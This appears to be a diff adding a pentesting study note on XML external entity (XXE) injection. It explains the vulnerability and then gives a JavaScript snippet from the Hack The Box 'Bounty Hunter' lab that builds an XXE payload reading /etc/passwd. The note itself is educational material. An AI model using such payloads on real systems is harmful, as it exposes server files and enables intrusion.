@@ -1,0 +1,27 @@
+#+title: XML External Entity (XXE) Injection
+#+hugo_base_dir: /home/kdb/Documents/github/owlglass
+#+hugo_auto_set_lastmod: t
+#+options: H:2
+#+HUGO_SECTION: infosec/pentesting/web
+#+hugo_weight: 6
+
+* XXE Injection
+XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access ([[https://portswigger.net/web-security/xxe]]).
+
+Sometimes the XXE can lead to SSRF and consequently the compromise of the server or other back-end infrastructure.
+
+** Origins
+Some apps pass data between the browser and server using XML format, usually with the help of a standard library or platform API to process the XML data on the server.  The XML specification contains potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.  XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.
+* Examples
+** Bounty Hunter - HTB
+#+begin_src js
+var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">] >
+        <bugreport>
+        <title>&xxe;</title>
+        <cwe>test</cwe>
+        <cvss>test</cvss>
+        <reward>test</reward>
+        </bugreport>`
+returnSecret(btoa(xml));
+#+end_src
